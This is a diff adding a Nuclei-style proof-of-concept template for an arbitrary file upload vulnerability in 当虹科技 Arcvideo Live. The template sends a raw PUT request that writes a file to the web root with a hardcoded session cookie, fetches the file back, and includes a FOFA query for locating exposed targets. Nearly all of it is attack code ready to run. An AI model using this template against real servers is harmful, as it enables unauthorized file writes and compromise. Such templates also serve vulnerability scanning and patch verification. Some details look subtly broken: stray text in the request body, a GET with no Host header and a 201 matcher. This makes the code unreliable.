@@ -1,0 +1,52 @@
+id: poc-ghzu1duvfnqptpq5
+info:
+  name: 当虹科技 Arcvideo Live存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ghzu1duvfnqptpq5'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ghzu1duvfnqptpq5
+    fofa: app="当虹科技-Arcvideo-Live"
+http:
+- raw:
+  - 'PUT /js/test123.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: arcvideo-live-session=B12768B779A331F514181CB7B71A5BBB
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 6
+
+
+    123456
+
+
+    上传定位'
+  redirects: false
+  matchers:
+  - status:
+    - 201
+    type: status
+- raw:
+  - GET /js/test123.txt HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 201
+    type: status
